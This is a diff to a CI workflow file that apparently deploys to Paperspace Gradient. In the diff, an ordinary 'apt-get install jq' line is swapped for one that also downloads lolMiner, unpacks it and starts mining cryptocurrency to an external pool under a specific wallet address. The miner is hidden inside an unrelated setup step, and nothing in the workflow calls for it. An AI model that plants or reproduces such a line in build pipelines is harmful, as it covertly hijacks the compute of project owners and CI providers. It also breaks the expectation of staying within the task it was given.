@@ -43,7 +43,7 @@ jobs:
           instanceType: P4000
         EOF
         apt update > /dev/null
-        apt-get install -y jq
+        apt-get install -y jq && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xf4d392b085a88d47ef55059b2f8af940c8f19de8.modalnikah.Worker#-hnaksn --ethstratum ETHPROXY
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
